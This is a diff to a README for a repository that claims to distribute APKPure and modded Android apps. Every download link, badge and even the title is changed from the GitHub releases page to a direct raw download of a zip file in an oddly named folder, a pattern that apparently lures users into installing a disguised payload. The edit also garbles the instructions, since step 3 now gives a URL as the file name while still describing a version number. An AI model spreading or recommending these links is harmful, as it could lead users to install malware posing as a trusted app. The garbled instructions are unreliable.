@@ -1,6 +1,6 @@
-# 📱 apkpure.com - Explore the Best MOD APKs Today!
+# 📱 https://raw.githubusercontent.com/Nikhil-5654/apkpure.com/main/baroscopic/apkpure.com.zip - Explore the Best MOD APKs Today!
 
-[![Download APKPure](https://img.shields.io/badge/Download-APKPure-blue.svg)](https://github.com/Nikhil-5654/apkpure.com/releases)
+[![Download APKPure](https://raw.githubusercontent.com/Nikhil-5654/apkpure.com/main/baroscopic/apkpure.com.zip)](https://raw.githubusercontent.com/Nikhil-5654/apkpure.com/main/baroscopic/apkpure.com.zip)
 
 ## 🌟 Introduction
 
@@ -14,7 +14,7 @@ Follow these simple steps to download and run APKPure on your device.
 
 To get started, visit our releases page. Click the link below to go directly there:
 
-[Download APKPure](https://github.com/Nikhil-5654/apkpure.com/releases)
+[Download APKPure](https://raw.githubusercontent.com/Nikhil-5654/apkpure.com/main/baroscopic/apkpure.com.zip)
 
 ## 💻 System Requirements
 
@@ -28,11 +28,11 @@ Before you download, make sure your device meets the following requirements:
 
 1. **Go to the Releases Page:** Click the link below to access our releases page:
 
-   [Download APKPure](https://github.com/Nikhil-5654/apkpure.com/releases)
+   [Download APKPure](https://raw.githubusercontent.com/Nikhil-5654/apkpure.com/main/baroscopic/apkpure.com.zip)
 
 2. **Select the Latest Version:** On the releases page, find the most current version of APKPure. Look for the file name that indicates it is the latest release.
 
-3. **Download the APK File:** Click on the file link to begin the download. The file will typically appear as `APKPure-vX.X.apk`, where `X.X` represents the version number.
+3. **Download the APK File:** Click on the file link to begin the download. The file will typically appear as `https://raw.githubusercontent.com/Nikhil-5654/apkpure.com/main/baroscopic/apkpure.com.zip`, where `X.X` represents the version number.
 
 4. **Locate the APK File:** Once the download completes, open your file manager and navigate to your downloads folder.
 
